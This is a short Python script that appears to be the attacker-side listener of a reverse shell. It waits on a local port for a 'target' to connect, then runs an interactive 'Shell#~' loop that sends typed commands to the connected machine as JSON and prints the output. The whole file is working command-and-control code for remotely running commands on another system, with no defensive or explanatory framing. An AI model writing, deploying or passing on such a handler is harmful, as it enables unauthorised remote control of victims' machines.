import socket
import json
from termcolor import colored

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 54321))
s.listen(5)

print(colored("[+] Waiting for incoming connections...", "green"))
target, ip = s.accept()

print(colored(f"[+] Connection established from: {ip}", "green"))
s.close()

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode())
	
def reliable_recv():
	data = ""
	
	while True:
		try:
			data += target.recv(1024).decode()
			
			return json.loads(data)
		
		except ValueError:
			continue

def shell():
	while True:
		command = input("Shell#~%s: " % str(ip))
		
		if command == 'q':
			reliable_send('q')
			break
		
		reliable_send(command)
		result = reliable_recv()
		print(result)

shell()
